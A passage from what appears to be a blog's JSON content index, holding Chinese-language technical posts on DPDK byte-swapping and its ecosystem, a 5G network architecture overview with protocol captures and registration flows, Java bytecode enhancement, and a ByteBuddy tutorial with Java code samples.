(((uint32_t)(v) &amp; UINT32_C(0x0000ff00)) &lt;&lt; 8) | \\ (((uint32_t)(v) &amp; UINT32_C(0x00ff0000)) &gt;&gt; 8) | \\ (((uint32_t)(v) &amp; UINT32_C(0xff000000)) &gt;&gt; 24)) 5）使用CPU指令现代CPU提供很多指令可直接完成常见功能，比如大小端转换，x86有bswap指令直接支持了。12345678static inline uint64_t rte_arch_bswap64(uint64_t _x)&#123; register uint64_t x = _x; asm volatile (&quot;bswap %[x]&quot; : [x] &quot;+r&quot; (x) ); return x;&#125; 这个实现，也是GLIBC的实现，先常量优化、CPU指令优化、最后才用裸代码实现。毕竟都是顶端程序员，对语言、编译器，对实现的追求不一样，所以造轮子前一定要先了解好轮子。Google开源的cpu_features可以获取当前CPU支持什么特性，从而对特定CPU进行执行优化。高性能编程永无止境，对硬件、内核、编译器、开发语言的理解要深入且与时俱进。七、DPDK生态对我们互联网后台开发来说DPDK框架本身提供的能力还是比较裸的，比如要使用DPDK就必须实现ARP、IP层这些基础功能，有一定上手难度。如果要更高层的业务使用，还需要用户态的传输协议支持。不建议直接使用DPDK。目前生态完善，社区强大（一线大厂支持）的应用层开发项目是FD.io（The Fast Data Project），有思科开源支持的VPP，比较完善的协议支持，ARP、VLAN、Multipath、IPv4/v6、MPLS等。用户态传输协议UDP/TCP有TLDK。从项目定位到社区支持力度算比较靠谱的框架。腾讯云开源的F-Stack也值得关注一下，开发更简单，直接提供了POSIX接口。Seastar也很强大和灵活，内核态和DPDK都随意切换，也有自己的传输协议Seastar Native TCP/IP Stack支持，但是目前还未看到有大型项目在使用Seastar，可能需要填的坑比较多。我们GBN Gateway项目需要支持L3/IP层接入做Wan网关，单机20GE，基于DPDK开发。","categories":[{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/categories/5G/"}],"tags":[{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/tags/5G/"},{"name":"DPDK","slug":"DPDK","permalink":"https://wuhaocn.github.io/tags/DPDK/"}]},{"title":"5G网络","slug":"network/3gpp/5G移动网络","date":"2021-08-04T06:25:13.668Z","updated":"2021-08-24T07:20:36.540Z","comments":true,"path":"2021/08/04/network/3gpp/5G移动网络/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/network/3gpp/5G%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C/","excerpt":"","text":"5G网络概述1.网络架构 5G网络的主要涵盖基站(gNB)、承载网、5G核心网(5GC)、IMS核心网(IMS)、5G消息(RCS)、边缘计算(MEC)等网络功能模块,借助上述网路功能模块，提供无线射频信号的收发、网路流量的转发、短信、音视频电话、富媒体消息、MAAP消息业务(类似微信公众号+小程序)等。下图为5G网络架构图。下文分别针对设备接入层、接入网、5G核心网、IMS网络、5G消息等模块进行介绍。 设备接入（5G手机）： 设备网络通信模块主要是基于芯片，市面上分为高通、海思、天玑等几大类。主流手机小米10、华为P40、华为Mate、荣耀30等之后型号基本都支持。 接入网（gNB）： gNB主要分为宏基站与微基站（室内站），国内宏基站以华为、中兴、大唐为主，以华为基站为例包含AAU 、BBU，AAU负责无线信号收发，BBU与核心网联通，微基站以京信、共进、佰才邦，以共进为例，主要是以一体化基站为主。其中宏基站用于增加网路覆盖，微基站用于增强信号质量。 5G核心网(5GC)： 核心网络建设主要用于提供 5G 终端设备（如手机，车载终端，摄像头等设备）的身份鉴权、流量分发、边缘计算、网络切片等业务能力，核心网网元较多，这针对重点网元进行介绍，AMF用于提供用户接入控制，对外主要网络协议为NAS、NGAP，UDM用于提供用户信息存储，即用户开卡信息，网络认证秘钥等， SMF用于提供网络流量控制，UPF用于提供网络流量转发。 IMS核心网(IMS)： 主要提供短信、音视频通话、电话会议等能力，主要通信协议为SIP、RTP，音频编解码为AMR，视频编解码4G为H264,5G为H265。其中SBC/P-CSCF提供终端接入功能, CSCF提供信令路由功能，IP Centex提供会议接入等功能。 5G消息(RCS)： 5G消息主要提供富媒体通信能力，借助手机原生能力能力实现富媒体通信，主要提供单聊、群聊、MAAP等业务，对手机侧通信协议主要包含SIP、MSRP等协议，对企业接入主要提供HTTP协议。 通过上述业务分析，相比原有通信能力，5G网络整体趋势为网络精细化、网络开放化、通信多样化、网络智能化演进。 下文对主要业务流程进行接入. 5G核心网文档可参考(TS 23.501, TS 23.502) 2.5G主要网络协议栈2.1 4/5G协议栈对比相比4G核心网来说主要是架构及内部协议层面： 5G核心网架构发生比较大的变化，引入NRF设备用于网络设备的注册与发现 网元间协议由原来的diamter换为http2 用户面与控制面解耦，为UPF下沉提供支持 控制面协议有s1-ap改为ngap 用户面协议增加扩展头 2.2 5G数据面传输协议 5G网络中UPF设备主要用于用户面数据的转发，主要功能是流量控制以及GTP包的拆解包。 https://github.com/5GOpenUPF/openupf 3.5G网络重要特性 3.1 网络切片5G网络基于三大业务场景的网络切片，使切片场景更加多样化。 eMBB，提供大带宽流量通道，主要是借助无线侧提升带宽上限。 uRLLC，提供低时延网络，主要借助边缘网络进行边缘计算降低端到端网络距离。 mMTC，提供大规模机器通信，及4G中NB-IOT规范在制定中预计R16版本制定。现在采用4G核心网eLTE增强实现。 切片实现基于核心网信令侧提供切片标识传输，用户面实现切片能力提供。切片承载标识以NSSAI，SST，SD等作为切片标识。详细可参考：https://www.yuque.com/wuhao-bo7rr/rb9zmq/epd319 3.2 边缘计算 概述 边缘计算在靠近数据源或用户的地方提供计算、存储等基础设施，并为边缘应用提供云服务和 IT 环境服务。相比于集中部署的云计算服务，边缘计算解决了时延过长、汇聚流量过大等问题，为实时性和带宽密集型业务提供更好的支持。随着 5G 和工业互联网的快速发展，新兴业务对边缘计算的需求十分迫切。在众多垂直行业新兴业务中，对边缘计算的需求主要体现在时延、带宽和安全三个方面。 实现 UPF 地址下发可采用 NRF(5G 网络注册设备)获取或 OAM(系统配置)配置 通过 5G 核心网配置及 SMF 下发 UPF 地址实现 UPF 地址的下沉 示例 以移动边缘计算平台为例主要涵盖 边缘设备管理 支持纳管不同算力、不同平台的边缘节点，实现对边缘节点和终端设备进行管理，如：状态监控、资源调度、日志查询等 边缘协议适配 边缘计算通过驱动方式灵活支持多种工业协议设备接入，原生支持MQTT、OPC-UA、Modbus协议设备接入 边缘应用管理 边缘应用市场提供预置边缘容器应用，也可进行自定义应用开发，并支持下发至边缘节点运行，云端可对应用进行全生命周期管理 边缘数据路由 支持将边缘节点数据通过灵活的方式路由到OneNET云端。并可以通过云端再分发到其他PaaS服务或客户自有应用 边缘规则计算 支持在边缘节点进行规则引擎计算，按照既定规则进行匹配，若匹配成功后则按照相关预定动作执行 边缘数据存储 支持在边缘节点进行多并发的海量时序列数据库存储，并在断网的情况自动实现离线存储 边缘数据分析 基于flink计算引擎，实现在云端通过可视化的方式配置计算任务，再下发到边缘节点执行 边缘智能推理 通过预置应用方式，将针对特定行业和场景的AI模型下发至边缘节点进行推理 参考 移动边缘计算平台：https://open.iot.10086.cn/productservice/edge/ 5G开源边缘计算平台https://gitee.com/edgegallery4.关键技术点解析 4.1 无线侧增强各网络速率对比 网络制式 2G 3G 4G 5G 下行速率 150K 2.8Mbps 100Mbps 1.54Gbps 上行速率 40K 384Kbps 50Mbps 308Mbps \u0000 5G网速计算公式 △ 5G载波的峰值计算公式 MIMO层数：下行4层，上行2层。 调制阶数：下行8阶（256QAM），上行6阶（64QAM）。 编码码率：948/1024≈0.926。 PRB个数：273，公式里面的12代表每个PRB包含12个子载波。 资源开销占比意为无线资源中用作控制，不能用来发送数据的比例，协议给出了典型的数据：下行14%，上行8%。 符号数意为每秒可实际传送数据的符号个数，因不同的TDD帧结构而异，具体可参考前面第二部分的表格。现取2.5毫秒双周期帧结构的值：下行18400，上行9200。 △ 5G载波的峰值计算因素图示把上述数据代入前面的公式，可得： 下行峰值速率为：1.54Gbps 上行峰值速率为：308Mbps 现在电信和联通正在共享3.5GHz频段上的100MHz的带宽，单个手机能达到的理论速率就是上述的两个值。如果这两家后续开通200MHz的话，因为带宽翻倍，速率也将翻倍，下行速率可以高达3.08Gbps！详细可参考：https://zhuanlan.zhihu.com/p/108553808​ 4G理论网速 ** LTE-Advanced（长期演进技术升级版）：** LTE的升级演进，由3GPP所主导制定，完全向后兼容LTE，通常通过在LTE上通过软件升级即可，升级过程类似于从W-CDMA升级到HSPA。峰值速率：下行1Gbps，上行500Mbps。是第一批被国际电信联盟承认的4G标准，也是事实上的唯一主流4G标准。另有TD-LTE的升级演进TD-LTE-Advanced（TD-LTE-A）。** LTE FDD（频分双工长期演进技术）：** 最早提出的LTE制式，目前该技术最成熟，全球应用最广泛，终端种类最多[5]。峰值速率：下行150Mbps，上行40Mbps。** LTE TDD（时分双工长期演进技术）：** 又称TD-LTE，是LTE的另一个分支。峰值速率：下行100Mbps，上行50Mbps。由上海贝尔、诺基亚西门子通信、大唐电信、华为技术、中兴通信、中国移动、高通、ST-Ericsson等业者共同开发。** WirelessMAN-Advanced（无线城域网升级版）：** 又称WiMAX-Advanced、WiMAX 2，即IEEE 802.16m是WiMAX的升级演进，由IEEE所主导制定，接收下行与上行最高速率可达到100Mbps，在静止定点接收可高达1Gbps。也是国际电信联盟承认的4G标准，不过随着Intel于2010年退出，WiMAX技术也已经被运营商放弃，并开始将设备升级为TD-LTE。 运营商 上行(MHz) 下行(MHz) 上行速率(bps) 下行速率(bps) 中国电信 2370～2390 2635～2655 50M 100M 中国移动 2300～2320 2555～2575 50M 100M 中国联通 1880～1900、2320～2370 2575～2635 50M 100M 详细可参考：https://zh.wikipedia.org/wiki/4G 3G理论网速 3G理论网速为1-6Mbps，折合下载速度120K/s-600K/s；是指支持高速数据传输的蜂窝移动通讯技 术。3G服务能够同时传送声音及数据信息，速率一般在几百kbps以上； 运营商 上行(MHz) 下行(MHz) 上行速率(bps) 下行速率(bps) 调制方式 CDMA2000 (中国电信) 825～835 870～880 1.8M 3.1M FDD TD-SCDMA (中国移动) 1880～1920 2010～2025 384K 2.8M TDD WCDMA (中国联通) 1920-1980 2110～2170 5.76M 7.2M FDD 详细可参考：https://zh.wikipedia.org/wiki/3G 2G理论网速 2G理论网速是150Kbps，折合下载速度15-20K/s；2G是第二代手机通信技术规格，以数字语音传输技术为核心。一般定义为无法直接传送如电子邮件、软件等信息；只具有通话和一些如时间日期等传送的手机通信技术规格； 运营商 制式 上行速率(bps) 下载速率(bps) 理论峰值(bps) 带宽 移动 GPRS 21.4K 85.6K 171.2K 150K EDGE 45K 90K 384K 200K 联通 GPRS 21.4K 85.6K 171.2K 150K EDGE 45K 90K 384K 200K 详细可参考：[https://jingyan.baidu.com/article/9158e0009e4708e2541228b4.html](https://jingyan.baidu.com/article/9158e0009e4708e2541228b4.html) 其他参考：[https://blog.csdn.net/mao834099514/article/details/79456881](https://blog.csdn.net/mao834099514/article/details/79456881) 4.2 控制面SCTP协议 UDP 用户数据报协议（_UDP_，User Datagram Protocol） 123456789101112User Datagram Protocol, Src Port: 5060, Dst Port: 5060 Source Port: 5060 Destination Port: 5060 Length: 356 Checksum: 0xf8a5 [unverified] [Checksum Status: Unverified] [Stream index: 0] [Timestamps] [Time since first frame: 0.007303000 seconds] [Time since previous frame: 0.007303000 seconds] UDP payload (348 bytes) TCP 传输控制协议（_TCP_，Transmission Control Protocol） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647Transmission Control Protocol, Src Port: 54872, Dst Port: 6070, Seq: 1, Ack: 1, Len: 3294 Source Port: 54872 Destination Port: 6070 [Stream index: 84] [TCP Segment Len: 3294] Sequence Number: 1 (relative sequence number) Sequence Number (raw): 1324026701 [Next Sequence Number: 3295 (relative sequence number)] Acknowledgment Number: 1 (relative ack number) Acknowledgment number (raw): 3153941596 1000 .... = Header Length: 32 bytes (8) Flags: 0x018 (PSH, ACK) 000. .... .... = Reserved: Not set ...0 .... .... = Nonce: Not set .... 0... .... = Congestion Window Reduced (CWR): Not set .... .0.. .... = ECN-Echo: Not set .... ..0. .... = Urgent: Not set .... ...1 .... = Acknowledgment: Set .... .... 1... = Push: Set .... .... .0.. = Reset: Not set .... .... ..0. = Syn: Not set .... .... ...0 = Fin: Not set [TCP Flags: ·······AP···] Window: 32748 [Calculated window size: 32748] [Window size scaling factor: -1 (unknown)] Checksum: 0x3972 [unverified] [Checksum Status: Unverified] Urgent Pointer: 0 Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps TCP Option - No-Operation (NOP) Kind: No-Operation (1) TCP Option - No-Operation (NOP) Kind: No-Operation (1) TCP Option - Timestamps: TSval 919902009, TSecr 919895231 Kind: Time Stamp Option (8) Length: 10 Timestamp value: 919902009 Timestamp echo reply: 919895231 [SEQ/ACK analysis] [Bytes in flight: 3294] [Bytes sent since last PSH flag: 3294] [Timestamps] [Time since first frame in this TCP stream: 0.000000000 seconds] [Time since previous frame in this TCP stream: 0.000000000 seconds] TCP payload (3294 bytes) 详细参考：https://segmentfault.com/a/1190000022410446​ SCTP 流控制传输协议SCTP(Stream Control Transmission Protocol) 123456789101112131415161718192021Stream Control Transmission Protocol, Src Port: 38412 (38412), Dst Port: 38412 (38412) Source port: 38412 Destination port: 38412 Verification tag: 0x0491fd24 [Association index: 65535] Checksum: 0xc759d633 [unverified] [Checksum Status: Unverified] DATA chunk(ordered, complete segment, TSN: 39, SID: 1, SSN: 33, PPID: 60, payload length: 67 bytes) Chunk type: DATA (0) Chunk flags: 0x03 .... 0... = I-Bit: Possibly delay SACK .... .0.. = U-Bit: Ordered delivery .... ..1. = B-Bit: First segment .... ...1 = E-Bit: Last segment Chunk length: 83 Transmission sequence number: 39 Stream identifier: 0x0001 Stream sequence number: 33 Payload protocol identifier: NGAP (60) Chunk padding: 00 详细参考：https://zhuanlan.zhihu.com/p/67819220 协议 安全可靠 小包传输 大包传输 生态健全 成熟度 UDP * *** *** *** *** TCP ** ** * *** *** SCTP *** * ** * ** 4.3 网络转发常见的网路转发技术分为用户态转发技术、内核态转发技术、UIO旁路转发技术，之外还有交换芯片之类的这里不做过多介绍，下面主要介绍用户态、内核态、UIO旁路转发。在转发速率，难度及趋势上做了相关对比 类型 用户态 内核态 DPDK 速度 * ** *** 开发难度 * ***(不小心把内核态搞崩) ** 周边工具 *** *** (借助VPP可以达到**) 社区趋势 * * *** 综上所述DPDK基本是网络转发技术主流。https://www.yuque.com/wuhao-bo7rr/rb9zmq/ak1moi 5.主要业务流程 商用手机终端入网，基站握手、核心网注册、IMS注册为必须项，只完成核心网注册，未完成IMS注册手机会自动掉线。 5.1 基站建联​ 手机与基站建联主要流程可以归结为： 小区搜索与选择 UE开机选网，小区搜索并完成下行同步。 系统消息广播 UE读取广播信息，选择合适小区进行驻留。 随机接入 UE与gNB建立上行同步。 RRC连接建立 UE与gNB建立RRC连接。 注册过程 UE注册到5G网络，网络侧开始维护该UE的上下文。​ 5.2 核心网注册 整体可归纳为： 注册请求 终端携带SIM信息进行注册，核心网通过用户信息在UDM查询数据，以此判断是否需要identity request 鉴权处理 核心网查询到用户信息后，发起Authentication request，终端收到请求后进行校验，回复Authentication response 此时双方共同进行双向鉴权。 加密协商 终端与网络双方为选择加密算法，可选类型为4种，其中第一种为不加密，其余三种为加密算法，加密算法包含完整性保护算法和报文加密算法，分别是为了保护报文的安全性与正确性 注册完成 网络侧返回注册完成，网络侧会携带网络能力告知终端。比如4G回落，IP短信能力。 无线能力上报 终端上报无线能力，终端上报无线能力至服务端，此信令为非必须应答信令 会话创建 终端创建流量传输通道，核心网在网络侧分配网络资源，此处一般会创建两个会话通道一个是IMS用来发短信打电话，一个是internet用来上网。由于IMS网络与Internet网络隔离这就是为什么在人多的地方有的时候网速慢打电话确没有影响。 IMS注册 终端完成会话通道创建后，会发起sip注册，商用终端必须完成sip注册后才可进行上网，这个原因大概是上网功能与ims功能为运营商基础能力，都需要完成后才算入网完成，手机层面表现为，出现HD为IMS网络注册完成。 详细可参考：https://www.yuque.com/wuhao-bo7rr/rb9zmq/gv4tpd 5.3 IMS注册 5.4 短信发送 5.5 语音呼叫 ​","categories":[{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/categories/5G/"}],"tags":[{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/tags/5G/"},{"name":"MEC","slug":"MEC","permalink":"https://wuhaocn.github.io/tags/MEC/"},{"name":"网络切片","slug":"网络切片","permalink":"https://wuhaocn.github.io/tags/%E7%BD%91%E7%BB%9C%E5%88%87%E7%89%87/"}]},{"title":"java字节码增强","slug":"language/java/bytecode/java字节码增强","date":"2021-08-04T06:25:13.668Z","updated":"2021-08-04T06:25:13.668Z","comments":true,"path":"2021/08/04/language/java/bytecode/java字节码增强/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/java/bytecode/java%E5%AD%97%E8%8A%82%E7%A0%81%E5%A2%9E%E5%BC%BA/","excerpt":"","text":"Java 字节码增强探秘1.字节码1.1 什么是字节码？Java 之所以可以“一次编译，到处运行”，一是因为 JVM 针对各种操作系统、平台都进行了定制，二是因为无论在什么平台，都可以编译生成固定格式的字节码（.class 文件）供 JVM 使用。因此，也可以看出字节码对于 Java 生态的重要性。之所以被称之为字节码，是因为字节码文件由十六进制值组成，而 JVM 以两个十六进制值为一组，即以字节为单位进行读取。在 Java 中一般是用 javac 命令编译源代码为字节码文件，一个.java 文件从编译到运行的示例如图 1 所示。 对于开发人员，了解字节码可以更准确、直观地理解 Java 语言中更深层次的东西，比如通过字节码，可以很直观地看到 Volatile 关键字如何在字节码上生效。另外，字节码增强技术在 Spring AOP、各种 ORM 框架、热部署中的应用屡见不鲜，深入理解其原理对于我们来说大有裨益。除此之外，由于 JVM 规范的存在，只要最终可以生成符合规范的字节码就可以在 JVM 上运行，因此这就给了各种运行在 JVM 上的语言（如 Scala、Groovy、Kotlin）一种契机，可以扩展 Java 所没有的特性或者实现各种语法糖。理解字节码后再学习这些语言，可以“逆流而上”，从字节码视角看它的设计思路，学习起来也“易如反掌”。本文重点着眼于字节码增强技术，从字节码开始逐层向上，由 JVM 字节码操作集合到 Java 中操作字节码的框架，再到我们熟悉的各类框架原理及应用，也都会一一进行介绍。 参考","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"字节码","slug":"字节码","permalink":"https://wuhaocn.github.io/tags/%E5%AD%97%E8%8A%82%E7%A0%81/"}]},{"title":"bytebuddy介绍","slug":"language/java/bytecode/bytebuddy-code","date":"2021-08-04T06:25:13.667Z","updated":"2021-08-04T06:25:13.667Z","comments":true,"path":"2021/08/04/language/java/bytecode/bytebuddy-code/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/java/bytecode/bytebuddy-code/","excerpt":"","text":"字节码增强技术-Byte Buddy1.为什么需要在运行时生成代码？Java 是一个强类型语言系统，要求变量和对象都有一个确定的类型，不兼容类型赋值都会造成转换异常，通常情况下这种错误都会被编译器检查出来，如此严格的类型在大多数情况下是比较令人满意的，这对构建具有非常强可读性和稳定性的应用有很大的帮助，这也是 Java 能在企业编程中的普及的一个原因之一。然而，因为起强类型的检查，限制了其他领域语言应用范围。比如在编写一个框架是，通常我们并不知道应用程序定义的类型，因为当这个库被编译时， 我们还不知道这些类型，为了能在这种情况下能调用或者访问应用程序的方法或者变量，Java类库提供了一套反射 API。使用这套反射 API， 我们就可以反省为知类型，进而调用方法或者访问属性。但是，Java 反射有如下缺点： 需要执行一个相当昂贵的方法查找来获取描述特定方法的对象，因此，相比硬编码的方法调用，使用 反射 API 非常慢。 反射 API 能绕过类型安全检查，可能会因为使用不当照成意想不到的问题，这样就错失了 Java 编程语言的一大特性。 2.简介正如官网说的：Byte Buddy 是一个代码生成和操作库，用于在Java应用程序运行时创建和修改Java类，而无需编译器的帮助。 除了Java类库附带的代码生成实用程序外，ByteBuddy还允许创建任意类，并且不限于实现用于创建运行时代理的接口。 此外，Byte Buddy提供了一种方便的API，可以使用Java代理或在构建过程中手动更改类。Byte Buddy 相比其他字节码操作库有如下优势： 无需理解字节码格式，即可操作，简单易行的 API 能很容易操作字节码。 支持 Java 任何版本，库轻量，仅取决于Java字节代码解析器库ASM的访问者API，它本身不需要任何其他依赖项。 比起JDK动态代理、cglib、Javassist，Byte Buddy在性能上具有优势。 3.性能在选择字节码操作库时，往往需要考虑库本身的性能。对于许多应用程序，生成代码的运行时特性更有可能确定最佳选择。而 在生成的代码本身的运行时间之外，用于创建动态类的运行时也是一个问题。官网对库进行了性能测试，给出以下结果图： 图中的每一行分别为，类的创建、接口实现、方法调用、类型扩展、父类方法调用的性能结果。 从性能报告中可以看出，Byte Buddy 的主要侧重点在于以最少的运行时生成代码，需要注意的是，我们这些衡量 Java 代码性能的测试， 都由 Java虚拟机即时编译器优化过，如果你的代码只是偶尔运行，没有得到虚拟机的优化，可能性能会有所偏差。 所以我们在使用 Byte Buddy 开发时，我们希望监控这些指标，以避免在添加新功能时造成性能损失。 4.Hello world代码123456789101112Class&lt;?&gt; dynamicType = new ByteBuddy() .subclass(Object.class) .method(ElementMatchers.named(&quot;toString&quot;)) .intercept(FixedValue.value(&quot;Hello World&quot;)) .make() .load(HelloWorldBuddy.class.getClassLoader()) .getLoaded(); Object instance = dynamicType.newInstance(); String toString = instance.toString(); System.out.println(toString); System.out.println(instance.getClass().getCanonicalName()); 从例子中看到，操作创建一个类如此的简单。正如 ByteBuddy 说明的，ByteBuddy 提供了一个领域特定语言，这样就可以尽可能地提高人类可读性简单易行的 API， 可能能让你在初次使用的过程中就能不需要查阅 API的前提下完成编码。这也真是 ByteBuddy 能完爆其他同类型库的一个原因。 上面的示例中使用的默认ByteBuddy配置会以最新版本的类文件格式创建Java类，该类文件格式可以被正在处理的Java虚拟机理解。 subclass指定了新创建的类的父类，同时 method 指定了 Object 的 toString 方法，intercept 拦截了 toString 方法并返回固定的 value ， 最后 make 方法生产字节码，有类加载器加载到虚拟机中。此外，Byte Buddy不仅限于创建子类和操作类，还可以转换现有代码。Byte Buddy 还提供了一个方便的 API，用于定义所谓的 Java 代理， 该代理允许在任何 Java应用程序的运行期间进行代码转换，代理会在下篇单独写一篇文章讲解。 5.创建一个类任何一个由 ByteBuddy 创建的类型都是通过 ByteBuddy 类的实例来完成的。通过简单地调用 new ByteBuddy() 就可以创建一个新实例。 123DynamicType.Unloaded&lt;?&gt; dynamicType = new ByteBuddy() .subclass(Object.class) .make(); 上面的示例代码会创建一个继承至 Object 类型的类。这个动态创建的类型与直接扩展 Object 并且没有实现任何方法、属性和构造函数的类型是等价的 。该列子没有命名动态生成的类型，但是在定义 Java类时却是必须的，所以很容易的你会想到，ByteBuddy 会有默认的策略给我们生成。 当然，你也可以很容易地明确地命名这个类型。 1234DynamicType.Unloaded&lt;?&gt; dynamicType = new ByteBuddy().subclass(Object.class).name(&quot;example.Type&quot;).make(); 那么默认的策略是如何做的呢？这个将与 ByteBuddy 与 约定大于配置息息相关，它提供了我们认为比较全面的默认配置。 至于类型命名，ByteBuddy 的默认配置提供了NamingStrategy，它基于动态类型的超类名称来随机生成类名。 此外，名称定义在与父类相同的包下，这样父类的包级访问权限的方法对动态类型也可见。如果你将示例子类命名为 example.Foo， 那么生成的名称将会类似于example.FooByteBuddy1376491271，这里的数字序列是随机的。 此外，在一些需要指定类型的场景中，可以通过重写 NamingStrategy 的方法来实现，或者使用 ByteBuddy 内置的NamingStrategy.SuffixingRandom 来实现。 同时需要注意的是，我们编码时需要遵守所谓的领域特定语言和不变性原则，这是说明意思呢？就是说在 ByteBuddy 中， 几乎所有的类都被构建成不可变的；极少数情况，我们不可能把对象构建成不可变的。请看下面一个例子： 123ByteBuddy byteBuddy = new ByteBuddy();byteBuddy.with(new NamingStrategy.SuffixingRandom(&quot;suffix&quot;));DynamicType.Unloaded&lt;?&gt; dynamicType1 = byteBuddy.subclass(Object.class).make(); 上述例子你会发现类的命名策略还是默认的，其根本原因就是没有遵守上述原则导致的。所以在编码过程中要基于此原则进行。 6.加载类上节创建的 DynamicType.Unloaded，代表一个尚未加载的类，顾名思义，这些类型不会加载到 Java 虚拟机中，它仅仅表示创建好了类的字节码， 通过 DynamicType.Unloaded 中的 getBytes方法你可以获取到该字节码，在你的应用程序中， 你可能需要将该字节码保存到文件，或者注入的现在的 jar 文件中，因此该类型还提供了一个 saveIn(File) 方法， 可以将类存储在给定的文件夹中； inject(File)方法将类注入到现有的 Jar 文件中， 另外你只需要将该字节码直接加载到虚拟机使用，你可以通过 ClassLoadingStrategy 来加载。 如果不指定ClassLoadingStrategy，Byte Buffer根据你提供的ClassLoader来推导出一个策略，内置的策略定义在枚举ClassLoadingStrategy.Default中 WRAPPER：创建一个新的Wrapping类加载器 CHILD_FIRST：类似上面，但是子加载器优先负责加载目标类 INJECTION：利用反射机制注入动态类型 示例 12345Class&lt;?&gt; type = new ByteBuddy().subclass(Object.class).make().load(getClass().getClassLoader(), ClassLoadingStrategy.Default.WRAPPER).getLoaded() 这样我们创建并加载了一个类。我们使用 WRAPPER 策略来加载适合大多数情况的类。getLoaded 方法返回一个 Java Class 的实例，它就表示现在加载的动态类。 重新加载类 得益于JVM的HostSwap特性，已加载的类可以被重新定义： // 安装Byte Buddy的Agent，除了通过-javaagent静态安装，还可以： 12345678ByteBuddyAgent.install();Foo foo = new Foo(); new ByteBuddy() .redefine(Bar.class) .name(Foo.class.getName()) .make() .load(Foo.class.getClassLoader(), ClassReloadingStrategy.fromInstalledAgent()); assertThat(foo.m(), is(&quot;bar&quot;)); 可以看到，即使时已经存在的对象，也会受到类Reloading的影响。但是需要注意的是HostSwap具有限制： 类再重新载入前后，必须具有相同的Schema，也就是方法、字段不能减少（可以增加） 不支持具有静态初始化块的类 修改类 redefine 重定义一个类时，Byte Buddy可以对一个已有的类添加属性和方法，或者删除已经存在的方法实现。新添加的方法，如果签名和原有方法一致，则原有方法会消失。 rebase 类似于redefine，但是原有的方法不会消失，而是被重命名，添加后缀 $original，这样，就没有实现会被丢失。重定义的方法可以继续通过它们重命名过的名称调用原来的方法，例如类： 123class Foo &#123; String bar() &#123; return &quot;bar&quot;; &#125;&#125; rebase 之后： 1234class Foo &#123; String bar() &#123; return &quot;foo&quot; + bar$original(); &#125; private String bar$original() &#123; return &quot;bar&quot;; &#125;&#125; 7.方法拦截通过匹配模式拦截 ByteBuddy 提供了很多用于匹配方法的 DSL，如下例子： 123456789101112Foo dynamicFoo = new ByteBuddy() .subclass(Foo.class) // 匹配由Foo.class声明的方法 .method(isDeclaredBy(Foo.class)).intercept(FixedValue.value(&quot;One!&quot;)) // 匹配名为foo的方法 .method(named(&quot;foo&quot;)).intercept(FixedValue.value(&quot;Two!&quot;)) // 匹配名为foo，入参数量为1的方法 .method(named(&quot;foo&quot;).and(takesArguments(1))).intercept(FixedValue.value(&quot;Three!&quot;)) .make() .load(getClass().getClassLoader()) .getLoaded() .newInstance(); ByteBuddy 通过 net.bytebuddy.matcher.ElementMatcher 来定义配置策略，可以通过此接口实现自己定义的匹配策略。库本身提供的 Matcher 非常多。Uploading file… 8.方法委托使用MethodDelegation可以将方法调用委托给任意POJO。Byte Buddy不要求Source（被委托类）、Target类的方法名一致 123456789101112131415161718class Source &#123; public String hello(String name) &#123; return null; &#125;&#125;class Target &#123; public static String hello(String name) &#123; return &quot;Hello &quot; + name + &quot;!&quot;; &#125;&#125;String helloWorld = new ByteBuddy() .subclass(Source.class) .method(named(&quot;hello&quot;)).intercept(MethodDelegation.to(Target.class)) .make() .load(getClass().getClassLoader()) .getLoaded() .newInstance() .hello(&quot;World&quot;); 其中 Target 还可以如下实现： 12345class Target &#123; public static String intercept(String name) &#123; return &quot;Hello &quot; + name + &quot;!&quot;; &#125; public static String intercept(int i) &#123; return Integer.toString(i); &#125; public static String intercept(Object o) &#123; return o.toString(); &#125;&#125; 前一个实现因为只有一个方法，而且类型也匹配，很好理解，那么后一个呢，Byte Buddy到底会委托给哪个方法？Byte Buddy遵循一个最接近原则： intercept(int)因为参数类型不匹配，直接Pass 另外两个方法参数都匹配，但是 intercept(String)类型更加接近，因此会委托给它 同时需要注意的是被拦截的方法需要声明为public，否则没法进行拦截增强。除此之外，还可以使用 @RuntimeType 注解来标注方法 12345@RuntimeTypepublic static Object intercept(@RuntimeType Object value) &#123; System.out.println(&quot;Invoked method with: &quot; + value); return value;&#125; 9.参数绑定可以在拦截器（Target）的拦截方法 intercept 中使用注解注入参数，ByteBuddy 会根据注解给我们注入对于的参数值。比如： 1234void intercept(Object o1, Object o2)// 等同于void intercept(@Argument(0) Object o1, @Argument(1) Object o2)复制代码常用的注解如下表： 注解 描述 @Argument 绑定单个参数 @AllArguments 绑定所有参数的数组 @This 当前被拦截的、动态生成的那个对象 @DefaultCall 调用默认方法而非super的方法 @SuperCall 用于调用父类版本的方法 @RuntimeType 可以用在返回值、参数上，提示ByteBuddy禁用严格的类型检查 @Super 当前被拦截的、动态生成的那个对象的父类对象 @FieldValue 注入被拦截对象的一个字段的值 10.字段属性12345678910111213141516171819202122232425262728293031323334353637383940414243444546public class UserType &#123; public String doSomething() &#123; return null; &#125;&#125;public interface Interceptor &#123; String doSomethingElse();&#125;public interface InterceptionAccessor &#123; Interceptor getInterceptor(); void setInterceptor(Interceptor interceptor);&#125;public interface InstanceCreator &#123; Object makeInstance();&#125;public class HelloWorldInterceptor implements Interceptor &#123; @Override public String doSomethingElse() &#123; return &quot;Hello World!&quot;; &#125;&#125;Class&lt;? extends UserType&gt; dynamicUserType = new ByteBuddy() .subclass(UserType.class) .method(not(isDeclaredBy(Object.class))) // 非父类 Object 声明的方法 .intercept(MethodDelegation.toField(&quot;interceptor&quot;)) // 拦截委托给属性字段 interceptor .defineField(&quot;interceptor&quot;, Interceptor.class, Visibility.PRIVATE) // 定义一个属性字段 .implement(InterceptionAccessor.class).intercept(FieldAccessor.ofBeanProperty()) // 实现 